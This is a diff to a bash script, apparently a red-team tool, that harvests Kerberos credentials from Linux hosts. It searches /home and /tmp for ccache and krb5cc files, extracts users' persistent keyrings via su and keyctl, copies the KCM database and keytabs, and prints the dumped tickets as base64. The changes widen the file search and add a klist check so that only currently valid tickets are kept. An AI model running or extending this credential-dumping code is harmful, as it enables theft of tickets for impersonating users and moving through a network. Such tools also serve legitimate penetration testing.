@@ -341,7 +341,7 @@ dump_kcm() {
         return 4
     fi
     if [ ! -f "$LDB_FILE_SRC" ]; then
-        print_msg ERROR "LDB source file not found: $LDB_FILE_SRC"
+        print_msg INFO "LDB source file not found: $LDB_FILE_SRC"
         return 3
     fi
     if ! cp "$LDB_FILE_SRC" "$LDB_FILE" 2>/dev/null; then
@@ -615,9 +615,9 @@ dump_keyring() {
     print_msg DEBUG "[KEYRING] Extracting keyring for user='$user' (uid=$uid)"
     
     # Get persistent keyring ID for the user
-    PERSIST_ID=$(su - "$user" -c 'keyctl get_persistent @u')
+    PERSIST_ID=$(su - "$user" -c 'keyctl get_persistent @u' 2>/dev/null)
     if [[ -z "$PERSIST_ID" ]]; then
-        print_msg ERROR "Unable to get persistent keyring for $user"
+        print_msg WARN "Unable to get persistent keyring for $user"
         return 2
     fi
     print_msg DEBUG "Persistent keyring id: $PERSIST_ID"
@@ -730,12 +730,16 @@ dump_all() {
     # gather unique candidates
     declare -a candidates
 
-    # find *.ccache files
+    # find ccache files
     while IFS= read -r -d $'\0' f; do
         candidates+=("$f")
-    done < <(find /home /tmp -type f -name "*.ccache" -print0 2>/dev/null || true)
+    done < <(
+        find /home /tmp \
+            -type f \( -name "*.ccache" -o -name "*krb5cc*" \) \
+            -print0 2>/dev/null || true
+    )
 
-    # find files in directories containing 'krb5cc' (and without .ccache extension)
+    # find files in directories containing 'krb5cc'
     while IFS= read -r -d $'\0' f; do
         dir=$(dirname "$f")
         if echo "$dir" | grep -qi "krb5cc"; then
@@ -789,6 +793,33 @@ dump_all() {
         outfile=$(next_outfile "$base" ".ccache")
 
         if cp -- "$f" "$outfile" 2>/dev/null; then
+            # Validate ticket validity range via klist
+            klist_out=$(klist -c "FILE:$outfile" 2>/dev/null || true)
+            if [ -z "$klist_out" ]; then
+                print_msg WARN "klist can't parse $outfile; keeping file"
+            else
+                ticket_line=$(printf "%s\n" "$klist_out" | awk '/Valid starting/ {found=1; next} found && NF {print; exit}')
+                if [ -n "$ticket_line" ]; then
+                    start_field=$(printf "%s" "$ticket_line" | awk '{print $1" "$2}')
+                    expires_field=$(printf "%s" "$ticket_line" | awk '{print $3" "$4}')
+                    print_msg DEBUG "Ticket validity for $outfile: $start_field -> $expires_field"
+                    start_epoch=$(date -d "$start_field" +%s 2>/dev/null || true)
+                    expires_epoch=$(date -d "$expires_field" +%s 2>/dev/null || true)
+                    now_epoch=$(date +%s)
+                    if [ -n "$start_epoch" ] && [ -n "$expires_epoch" ]; then
+                        if [ "$now_epoch" -lt "$start_epoch" ] || [ "$now_epoch" -gt "$expires_epoch" ]; then
+                            print_msg DEBUG "Ticket in $outfile is not currently valid (Valid: $start_field -> $expires_field); removing file"
+                            rm -f "$outfile" || true
+                            continue
+                        fi
+                    else
+                        print_msg DEBUG "Could not parse ticket validity for $outfile; keeping file"
+                    fi
+                else
+                    print_msg DEBUG "No ticket line found in $outfile; keeping file"
+                fi
+            fi
+
             print_msg SUCCESS "Dumped $f -> $outfile"
             show_base64 "$outfile"
         else
@@ -797,7 +828,7 @@ dump_all() {
     done
 
     # search for .keytab files and copy them without validation
-    print_msg INFO "Scanning for keytab files..."
+    print_msg INFO "Searching for keytab files..."
     declare -a keytabs
     while IFS= read -r -d $'\0' k; do
         keytabs+=("$k")
@@ -844,8 +875,9 @@ detect_kerberos_realm
 
 # Handle modes: dump, monitor
 if [[ "$MODE" == "dump" ]]; then
-    print_msg INFO "Searching for any kerberos cache on the system"
+    print_msg INFO "Searching for any kerberos material on the system"
     dump_all
+    print_msg INFO "Dump complete"
     elif [[ "$MODE" == "monitor" ]]; then
     # List logged on users
     print_msg INFO "Searching for active sessions..."
